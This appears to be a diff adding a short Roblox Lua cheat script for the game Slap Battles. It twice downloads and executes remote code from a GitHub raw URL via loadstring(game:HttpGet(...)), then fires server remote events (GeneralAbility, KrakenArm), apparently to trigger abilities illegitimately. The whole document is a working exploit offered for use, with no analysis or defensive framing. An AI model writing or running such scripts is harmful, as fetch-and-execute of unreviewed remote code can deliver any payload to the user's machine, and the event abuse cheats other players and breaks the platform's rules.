@@ -1,0 +1,7 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/RobloxScripts2020/SlapBattlesCoders/refs/heads/main/baller'))()
+wait(1)
+game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
+wait(5)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/RobloxScripts2020/SlapBattlesCoders/refs/heads/main/kraken'))()
+wait(1.5)
+game:GetService("ReplicatedStorage").KrakenArm:FireServer()
